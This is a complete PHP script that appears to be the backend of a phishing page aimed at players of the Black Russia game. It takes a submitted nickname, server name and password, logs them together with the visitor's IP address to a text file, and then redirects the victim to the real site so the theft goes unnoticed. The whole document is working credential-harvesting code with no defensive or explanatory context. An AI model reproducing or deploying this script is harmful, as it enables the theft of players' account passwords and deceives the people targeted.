<?php
$nick = $_POST['nick'];
$server = $_POST['server'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$data = "Ник: $nick | Сервер: $server | Пароль: $pass | IP: $ip\n";
file_put_contents("log.txt", $data, FILE_APPEND);

header("Location: https://black-russia.ru");
exit();
?>
